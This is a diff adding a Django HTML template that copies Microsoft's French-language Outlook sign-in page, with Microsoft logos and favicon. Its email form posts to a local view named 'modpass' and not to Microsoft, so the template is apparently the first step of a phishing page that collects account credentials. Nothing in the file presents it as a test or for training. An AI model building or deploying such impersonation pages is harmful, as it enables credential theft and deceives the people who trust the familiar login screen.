@@ -1,0 +1,39 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'style5.css' %}">
+    <link rel="icon" type="image/x-icon" href="{% static 'micro.png' %}">
+    <title>Se connecter à Outlook</title>
+</head>
+<body>
+    <h2  class="titre" style="text-align: center;">Outlook</h2>
+    <div class="container">
+        <div class="title"><img src="{% static 'Microsoft-logo_rgb_c-gray.webp' %}" alt="" width="200" height="80"></div>
+        <div class="text">
+            <p>Se connecter</p>
+            <small>Continuer vers Outlook</small>
+        </div>
+        <div class="form">
+            <form action="{% url 'modpass' %}" method="post">
+                {% csrf_token %}
+                <input type="email" name="email" placeholder="E-mail, téléphone ou skype" class="input" >
+                <div class="footer">
+                    <small>Vous n'avez pas encore de compte? <a href="">Créez-en un!</a></small>
+                    <p>Votre compte n'est pas accessible ?</p>
+                </div>
+                <button type="submit" class="btn">Suivant</button>
+            </form>
+        </div>
+    </div>
+    <div class="option_co">
+        <div class="gau">
+            <img src="{% static 'keys.svg' %}" alt="" width="32" height="32">
+            <p>Options de connexion</p>
+        </div>
+        <div class="droi"></div>
+    </div>
+</body>
+</html>
